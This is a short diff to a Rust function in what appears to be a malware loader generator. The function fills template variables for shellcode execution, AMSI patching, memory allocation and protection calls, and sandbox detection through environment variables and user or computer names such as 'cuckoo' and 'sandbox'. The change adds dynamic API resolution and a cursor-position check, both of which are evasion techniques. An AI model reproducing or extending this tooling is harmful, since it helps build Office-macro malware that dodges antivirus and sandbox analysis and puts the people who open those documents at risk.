@@ -221,6 +221,7 @@ fn build_context(config: &LoaderConfig) -> Context {
         "fn_exec", "var_sc", "var_key", "sub_amsi", "sub_run",
         "task_name", "target_name", "class_name", "namespace", "module_name",
         "fn_valloc", "fn_movemem", "fn_vprotect", "fn_callwp", "fn_amsi_patch",
+        "fn_loadlib", "fn_getprocaddr",
         "progid", "desc", "service_name", "short_name",
         "title", "app_id", "app_name", "job_id",
     ] {
@@ -303,6 +304,8 @@ fn build_context(config: &LoaderConfig) -> Context {
         // Sandbox env var names
         ("vba_env_vbox",      "VBOX_VERSION"),
         ("vba_env_sandboxie", "SANDBOXIE_HOME"),
+        // Dynamically-resolved API names (no static Declare)
+        ("vba_get_cursor_pos", "GetCursorPos"),
         // Sandbox indicator strings (pipe-delimited for Split())
         ("vba_bad_users",     "sandbox|malware|virus|sample|cuckoo|user|admin"),
         ("vba_bad_computers", "sandbox|malware|virus|analysis|cuckoo"),
